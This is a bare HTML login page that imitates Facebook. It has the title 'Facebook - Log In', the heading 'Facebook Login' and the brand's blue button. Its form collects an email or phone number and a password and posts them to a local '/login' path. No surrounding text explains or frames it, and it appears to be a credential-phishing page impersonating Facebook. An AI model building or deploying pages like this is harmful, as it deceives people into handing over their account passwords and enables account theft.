<!DOCTYPE html>
<html>
<head>
<title>Facebook - Log In</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial, sans-serif; background: #f0f2f5; }
form { background: white; padding: 20px; margin: 50px auto; width: 90%; max-width: 350px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); }
input { width: 100%; padding: 12px; margin: 8px 0; }
button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; font-size: 16px; }
</style>
</head>
<body>
<form action="/login" method="POST">
<h2>Facebook Login</h2>
<input type="text" name="email" placeholder="Email or Phone" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</body>
</html>
